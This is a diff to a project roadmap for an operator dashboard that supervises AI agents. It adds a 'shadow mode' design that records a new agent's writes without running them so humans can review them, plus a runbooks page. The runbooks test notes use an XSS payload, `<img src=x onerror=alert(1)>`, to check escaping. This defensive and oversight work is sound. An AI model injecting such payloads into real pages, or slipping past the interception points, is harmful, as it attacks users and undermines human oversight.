+## Chunk F26 — Shadow mode for a new agent or model · slug `agent-shadow` · dashboard + MCP · **security reviewer reads the enforcement points**
+
+### Goal
+
+A new agent or model can be run for real while every write it attempts is
+recorded instead of run. The operator then compares what it would have done
+with what was really approved, and builds a track record before granting it
+anything.
+
+### Design
+
+* **A new agent-policy field, `shadow: 0|1`.** It is set by the operator,
+  and only on an agent whose SSH is MCP-only:
+  * it has no `ssh_hosts_allow` for direct SSH;
+  * its token is used only through `ssh_exec`.
+
+  A shadowed agent's direct-SSH use cannot be intercepted, so the design
+  refuses to enable shadow on an agent that has direct SSH access, and says
+  so.
+* **What changes for a shadowed agent.**
+  * **Reads behave as normal:**
+    * integration calls that pass `is_read_integration_call`;
+    * `ssh_exec` commands that pass `is_read_ssh`;
+    * F14 and F15.
+
+    They follow the agent's usual approval rules, so a read that would need
+    approval still does.
+  * **Everything else is recorded and not run:**
+    * integration writes, and calls `read_policy` does not class as reads;
+    * `ssh_exec` writes;
+    * F3 plans, F16 recipe runs, and F10/F11 actions.
+
+    Each is stored as a `shadow_calls` row with the agent, the session, the
+    tool or command, the arguments (scrubbed), the F1 breakdown, and what
+    Eshu's policy *would* have decided. That decision comes from the same
+    functions, called in dry form: blocked, freeze, needs approval, or plan
+    covered. Nothing reaches a gateway or an upstream API.
+  * **The agent is told.** The result is `{"status": "shadowed", "executed":
+    false, "message": "recorded only; this agent is in shadow mode"}`. Tool
+    descriptions for a shadowed agent carry one line saying so.
+* **Enforcement point.** There is one check, in `run_tool` and in
+  `ssh_exec`, before any upstream call. A test drives every write tool kind:
+  * HTTP and WS;
+  * handlers, including the ones `DRY_RUN_HANDLERS` exempts;
+  * the generic proxy;
+  * plans and recipes.
+
+  It asserts that nothing upstream is called. This is the part the security
+  reviewer reads.
+* **Compare.** A "Shadow" view per agent lists its recorded calls next to
+  the real requests that were approved on the same host in the same time
+  window, matched by F18's fingerprints (`command_sha`, `shape_sha`):
+  * **same as approved**;
+  * **similar shape**;
+  * **no match**;
+  * **would have been blocked**.
+
+  It also shows a summary count per category. Turning shadow off is an
+  ordinary policy edit, audited.
+
+### Tests to add (outline)
+
+* Every write path records and runs nothing upstream.
+* Reads run.
+* Shadow cannot be enabled on an agent with direct SSH.
+* The would-have decisions match the real ones for the same inputs.
+* The agent's result says `shadowed`.
+* A non-shadowed agent is unaffected.
+* The comparison categories on synthetic data.
+
+### Compat impact
+
+Additive: one policy column (default 0) and one table. Agents without shadow
+behave as now.
+
+### Acceptance criteria
+
+The tests pass; the security reviewer has read the enforcement points; and a
+test agent in shadow mode runs a short job in which every write shows in the
+Shadow view and nothing changed on the test host.
+
+### Implementer notes
+
+_(implementer)_
+
+### Reviewer notes
+
+_(reviewer)_
+
+---
+
+## Chunk X2 — Runbooks page · slug `runbooks-page` · dashboard UI · small
+
+### Goal
+
+F13 runbooks can be found by agents (`find_runbooks`), but the operator can
+only reach one through the session it came from. Give them a page of their
+own.
+
+### Design
+
+* `GET /api/runbooks?q=&tag=`: operator session auth, newest first, capped at
+  100. It reuses `core.conclusions.find_runbooks` for the search, so the
+  operator and the agents see the same ranking.
+* A "Runbooks" entry in the main navigation, next to Inventory. It shows:
+  * a list: title, when to use, tags, step count, source session, created;
+  * a search box and a tag filter;
+  * one click opens the existing runbook view (`GET /api/runbooks/{id}`),
+    with the ordered steps and their F1 breakdown, the known dead ends and a
+    link to the source session.
+* **Retire.** A runbook can be retired with a confirm dialog. Retiring is
+  audited, and a retired runbook is no longer served to agents. It is shown
+  greyed, under a "show retired" toggle. Retire is reversible. There is no
+  hard delete.
+* Everything rendered goes through the existing escaping helpers. Runbook
+  text came from an agent and is untrusted.
+
+### Tests to add
+
+* The list route needs a session (401 without).
+* Search and tag filters work.
+* Retire hides the runbook from `find_runbooks` and `get_runbook` for
+  agents, and un-retire brings it back.
+* Retire is audited.
+* A runbook title containing HTML is rendered escaped (a JS test or a
+  template test, whichever the existing UI tests use).
+
+### Compat impact
+
+One column, `runbooks.retired_at` (nullable). Additive.
+
+### Acceptance criteria
+
+The tests pass; the page works at phone width; and `bash scripts/verify.sh`
+is green.
+
+### Implementer notes
+
+**Routes.** `GET /api/runbooks?q=&tag=&include_retired=` is operator-only,
+capped at 100 by `list_runbook_payloads`, newest first, and it reuses
+`search_runbooks` — the same term-by-term search and tag match `find_runbooks`
+uses for agents, so the two see the same ranking (tested by comparing the two
+results for the same query). `GET /api/runbooks/{id}` now passes
+`include_retired=True`, because the operator's page must be able to open a
+retired runbook in order to restore it; every agent path still goes through
+`get_runbook_payload()` with the default, which hides a retired row.
+`POST /api/runbooks/{id}/retire` takes `{retired: true|false}`, is audited as
+`runbook_retired` / `runbook_unretired`, and returns the new state.
+
+**Retire is a column, not a delete.** `runbooks.retired_at` (nullable, with
+the usual `PRAGMA table_info` migration), set on retire and cleared on
+restore; a second retire keeps the first timestamp. `search_runbooks` and
+`get_runbook` both take `include_retired=False` as the default, so "hidden
+from agents" is the default everywhere and the operator page is the only
+caller that opts in. The MCP tools (`find_runbooks`, `get_runbook`) are
+untouched — a retired runbook simply is not there, and `get_runbook` still
+answers `not_found` rather than admitting that it exists.
+
+**The page.** `Runbooks` in the sidebar, next to Inventory
+(`VIEWS` in `state.js`): a search box, a tag box with a datalist built from
+the loaded rows, a "show retired" toggle, and one row per runbook with its
+title, `when_to_use`, tags, step count, age and source session. A row opens a
+modal with the steps in order — each command step carries the F1 breakdown
+that `build_steps` stored, rendered with the same `bdBlockHtml` the queue
+uses — the known dead ends, and the source session and conclusion ids. Retire
+and Restore sit on both the row and the modal, behind `customConfirm`.
+
+**Escaping.** Every runbook field is agent-authored. The renderers are split
+into pure builders (`runbookListHtml`, `runbookDetailHtml`) so the escaping is
+testable without a DOM: `tests/fixtures/x2_harness.js` loads the shipped
+`app.js` in the existing stubbed context and returns both strings with
+`<img src=x onerror=alert(1)>` in every field, and the test asserts the raw
+payload appears nowhere and `&lt;img` does. The tag chips and the retired chip
+are escaped the same way; the only unescaped interpolation is the numeric id
+through `idJs()`.
+
+**Layout.** The row is a two-column flex and collapses to a column under
+768 px (the button moves under the text), so the page works at phone width;
+the detail modal is `max-w-2xl` and scrolls inside `62vh`.
+
+Tests, `tests/test_x2_runbooks.py` (20) and the F13 suite unchanged (44
+together): the list needs a session (401), the fields are there, search
+matches the agents' ranking, the tag filter works, newest first, retired
+hidden unless asked; retire hides the runbook from `find_runbooks`,
+`search_runbooks`, `get_runbook`, `get_runbook_payload` and both MCP tools,
+the operator can still open it, un-retire restores it, retire is idempotent,
+an unknown id is `None`/404, and both routes are audited and session-gated;
+the rendered page escapes a hostile payload and still marks a retired row and
+renders steps, breakdown and dead ends.
+
+Compat: one nullable column, additive.
+
+`bash scripts/verify.sh`: `2662 passed, 22 skipped, 7 warnings in 538.62s (0:08:58)`.
+
+
+### Reviewer notes
+
+_(reviewer)_
+
+**Round 1 (feature reviewer, 2026-11-11, at `7fea1b0`): approved; merging.**
+
+The behaviour checked:
+* The list reuses F13's search and is operator-only.
+* `get_runbook()` hides a retired runbook by default, so every agent path
+  (`find_runbooks`, `get_runbook`, `core.conclusions` line 215) stays hidden
+  without a flag.
+* Only the operator route passes `include_retired`.
+* Retire is idempotent, reversible and audited.
+* The renderers' escaping is tested against the shipped `app.js`.
 
 ---
 
@@ -6920,31 +12226,30 @@ The implementer never deploys. The reviewer runs this gate (same shape as `docs/
 | 5a | X1 | ctx-actions | dashboard | Merged | `fix/x1-ctx-actions` | — | FYI to security reviewer (approve ignored status) |
 | 6 | F5 | exec-results | gateway + dashboard | Merged | `feat/f5-exec-results` | — | |
 | 6a | F18 | request-context | dashboard | Merged | `feat/f18-request-context` | F1, F5, F7, X1 | |
-| 7 | F12 | ssh-exec | dashboard + gateway | Ready (after F5) — design first | `feat/f12-ssh-exec` | F4, F5 | design approval + security reviewer sign-off |
+| 7 | F12 | ssh-exec | dashboard + gateway | Merged (`c0954cc`) | `feat/f12-ssh-exec` | F4, F5 | security reviewer re-checks the merged gateway bash |
 | 8 | F6 | session-wrapup | dashboard | Merged | `feat/f6-session-wrapup` | F3, F4, F5 | |
 | 9 | F13 | session-conclusions | dashboard + MCP | Merged | `feat/f13-session-conclusions` | F5, F6 | |
 | 10 | F8 | test-traffic | dashboard | Merged | `feat/f8-test-traffic` | — | low priority |
 | 11 | F9 | ha-supervisor-read | dashboard | Merged | `feat/f9-ha-supervisor-read` | — | token is now a dedicated `eshu` HA admin user |
-| 12 | F10 | ha-supervisor-actions | dashboard | Ready (after F9) | `feat/f10-ha-supervisor-actions` | F9, F3, Chunk H | reviewer pass + security reviewer sign-off |
-| 13 | F11 | ha-config-files | dashboard | Ready (after F10) — design first | `feat/f11-ha-config-files` | F10, F2, F5, F12 (runner) | design approval + security reviewer sign-off |
+| 12 | F10 | ha-supervisor-actions | dashboard | Merged (security sign-off `f9e2c22`) | `feat/f10-ha-supervisor-actions` | F9, F3, Chunk H | security re-reads the P1–P3 diff only |
+| 13 | F11 | ha-config-files | dashboard | Security round 7 (`9e75cad`): Z3/Z5 approved; **AH1–AH4 must** (descriptor-based reads, wider redaction, modes, refuse `!include secrets.yaml`), then security re-reads the changes | `feat/f11-ha-config-files` | F10, F2, F5, F12 (runner) | then code |
 | 14 | F14 | inventory | dashboard + MCP | Merged | `feat/f14-inventory` | Chunk H | |
-| 15 | F15 | probes | dashboard + MCP | Ready after F12 | `feat/f15-probes` | F4, F12 | |
-**Design round 3 (feature reviewer, 2026-11-10): approved; to the security
-reviewer.**
-* T1's per-token rule refuses `--host={fqdn}`, `x{fqdn}` and `\{fqdn}`, and
-  backslashes are banned.
-* T2's result-slot undo fails closed, accepts scalars only and is shown in the
-  preview.
-* T3 now uses real registry names. Turning the Pi-hole record into a run
-  precondition is the honest answer while no Pi-hole write tool exists.
-* The three-way registry walk (allowed / undo-only / forbidden) makes every
-  new tool a decision.
+| 15 | F19 | unattended-limits | gateway + dashboard | **Merged** 2026-11-11 (security sign-off `67bec51`; AF1/AF2 checked) | `feat/f19-unattended-limits` | F4, F5, F12 | AF3 goes on the next gateway branch |
+| 16 | F15 | probes | dashboard + MCP | **Merged** 2026-11-11 (AG1 security decision `eca8982`; AI1 fix merged) | `feat/f15-probes` | F4, F12, F14 | |
+| 17 | F21 | snapshot-approve | dashboard + Proxmox | Design first | `feat/f21-snapshot-approve` | F7, F14, F2 | + security sign-off (new write path, destructive rollback) |
+| 18 | F23 | change-journal | dashboard | **Merged** 2026-11-11 (AJ1/AJ2) | `feat/f23-change-journal` | F1, F5, F7, F14 | |
+| 18a | X2 | runbooks-page | dashboard UI | **Merged** 2026-11-11 | `feat/x2-runbooks-page` | F13 | |
+| 19 | F22 | change-checks | dashboard + MCP | After F19 merges | `feat/f22-change-checks` | F3, F5, F12, F19 | + security sign-off (the unattended check; AG1's origin rule does not cover it) |
+| 20 | F16 | recipes | dashboard + MCP | Design complete (security Round 4; feature reviewer Round 5 with AA1/AA2); code next after F22 | `feat/f16-recipes` | F3, F12, F13, F19 | main line; steps claim by request id; code comes back to security; auto_run comes back to security |
+| 21 | F24 | content-tripwire | dashboard | Design first | `feat/f24-content-tripwire` | F12, F14 | + security sign-off (retention) |
+| 22 | F25 | secrets-broker | gateway + dashboard | Design first | `feat/f25-secrets-broker` | F1, F12, F19; security Chunk 7 before deploy | + security sign-off; gateway bash line by line |
+| 23 | F26 | agent-shadow | dashboard + MCP | Ready after F16 | `feat/f26-agent-shadow` | F1, F12, F16, F18 | security reads the enforcement points |
+| 24 | F20 | local-agent-pass | docs | Parked | `docs/local-agent-pass` (local, unpushed) | — | experiment; last |
+| 25 | F17 | local-agent | dashboard + docs | After F20; pre-implementation notes A1–A6 | `feat/f17-local-agent` | F12–F16, F26 | experiment; last |
+| — | CI fix | ci-environment | gateway + tests | Merged (`f2746ef`); CI pinned to ubuntu-24.04 (`6d58006`) | `fix/ci-environment` | F5 | |
+| — | Buffering | stream-unbuffered | gateway | Merged (`d8d70c2`); S1 tee fix later | `fix/stream-unbuffered` | F5 | |
 
-Points for the security reviewer: R1/T1 templates, the R2/T3 tool lists, and
-R3/T2 rollback.
-
-| 16 | F16 | recipes | dashboard + MCP | **Round 5 folded (Y1, W2 + two code-time notes) — security approved Round 4; design closed** | `feat/f16-recipes` | F3, F12, F13 | feature reviewer checks Round 5 alone |
-| 17 | F17 | local-agent | dashboard + docs | Ready after F12–F16 | `feat/f17-local-agent` | F12–F16 | |
-| 18 | F19 | unattended-limits | gateway + dashboard | Design first; before F4 `on` is unlocked | `feat/f19-unattended-limits` | F4, F5 | design approval + security reviewer sign-off |
 Chunks are done **in the order column**; each new chunk branches from the
-updated `feature-roadmap` after the previous one is merged.
+updated `feature-roadmap` after the previous one is merged. A design-first
+chunk's design note may be written while the chunk before it is with a
+reviewer; its code still waits for its turn.
